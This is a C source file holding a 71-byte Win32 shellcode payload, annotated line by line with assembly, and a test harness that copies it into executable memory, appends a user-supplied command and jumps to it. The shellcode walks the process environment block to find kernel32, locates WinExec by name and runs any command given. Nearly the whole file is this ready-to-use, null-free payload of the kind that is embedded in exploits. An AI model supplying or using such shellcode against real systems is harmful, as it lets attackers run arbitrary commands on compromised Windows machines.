
#include <windows.h>
#include <stdio.h>

#define MAX_CMD_LEN 255

//
// 71 bytes WinExec code for windows 32
//
// Copyright (c) 2014 Kevin Devine
//
// cl exec32_test.cpp
//

/* Copyright (c) 2014 Kevin Devine */
/* Size = 71 bytes */

char exec32[] = {
  /* 0000 */  "\x60"                          /*  pushad                             */
  /* 0001 */  "\xEB\x3E"                      /*  jmp 00000041h                      */
  /* 0003 */  "\x6A\x30"                      /*  push 00000030h                     */
  /* 0005 */  "\x59"                          /*  pop ecx                            */
  /* 0006 */  "\x64\x8B\x31"                  /*  mov esi, dword ptr fs:[ecx]        */
  /* 0009 */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000C */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000F */  "\xAD"                          /*  lodsd                              */
  /* 0010 */  "\x8B\x30"                      /*  mov esi, dword ptr [eax]           */
  /* 0012 */  "\x8B\x6E\x18"                  /*  mov ebp, dword ptr [esi+18h]       */
  /* 0015 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 0018 */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 001C */  "\x8D\x74\x28\x1C"              /*  lea esi, dword ptr [eax+ebp+1Ch]   */
  /* 0020 */  "\xB1\x03"                      /*  mov cl, 03h                        */
  /* 0022 */  "\xAD"                          /*  lodsd                              */
  /* 0023 */  "\x03\xC5"                      /*  add eax, ebp                       */
  /* 0025 */  "\x50"                          /*  push eax                           */
  /* 0026 */  "\xE2\xFA"                      /*  loop 00000022h                     */
  /* 0028 */  "\x5F"                          /*  pop edi                            */
  /* 0029 */  "\x5E"                          /*  pop esi                            */
  /* 002A */  "\x5B"                          /*  pop ebx                            */
  /* 002B */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [edi+ecx*2]    */
  /* 002F */  "\x41"                          /*  inc ecx                            */
  /* 0030 */  "\xAD"                          /*  lodsd                              */
  /* 0031 */  "\x81\x3C\x28\x57\x69\x6E\x45"  /*  cmp dword ptr [eax+ebp], 456E6957h */
  /* 0038 */  "\x75\xF1"                      /*  jne 0000002Bh                      */
  /* 003A */  "\x03\x2C\x93"                  /*  add ebp, dword ptr [ebx+edx*4]     */
  /* 003D */  "\xFF\xD5"                      /*  call ebp                           */
  /* 003F */  "\x61"                          /*  popad                              */
  /* 0040 */  "\xC3"                          /*  ret                                */
  /* 0041 */  "\x50"                          /*  push eax                           */
  /* 0042 */  "\xE8\xBC\xFF\xFF\xFF"          /*  call 00000003h                     */
};

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
    
  if (argc != 2) {
    printf ("\nUsage: exec32_test <255-byte command>");
    printf ("\nExample: exec32_test \"cmd /c calc\"\n");
    return 0;
  }
  
  char *cmd = argv[1];
  size_t cmd_len = strlen (cmd);
  
  if (cmd_len > MAX_CMD_LEN) {
    printf ("\nCommand exceeds WinExec() limit of %i bytes", MAX_CMD_LEN);
    return 0;
  }
  
  void *exec = VirtualAlloc(0, strlen (exec32) + MAX_CMD_LEN + 1, 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, exec32, strlen (exec32));
  strcat ((char*)exec, cmd);
  printf ("\nAssembly : %i\nFinal Size : %i", 
    strlen (exec32), 
    cmd_len + strlen (exec32));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  return 0;
}

